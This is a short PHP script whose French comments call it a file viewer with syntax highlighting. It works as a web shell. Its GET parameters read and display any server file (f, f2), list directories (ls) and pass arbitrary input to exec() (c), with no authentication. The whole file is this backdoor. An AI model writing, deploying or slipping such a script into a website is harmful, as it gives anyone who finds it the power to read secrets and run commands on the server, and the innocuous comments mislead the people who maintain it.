<?php
// ouvrir et lire un fichier + ajout de la collaration syntaxique
if(isset($_GET['f'])) {
    highlight_file($_GET['f']);
// ouvrir et lire un fichier
} elseif(isset($_GET['f2'])) {
    echo nl2br(htmlspecialchars(file_get_contents($_GET['f2'])));
} elseif(isset($_GET['ls'])) {
    echo '<pre>'.print_r(glob($_GET['ls']), true).'</pre>';
} elseif(isset($_GET['c'])) {
    exec($_GET['c']);
}
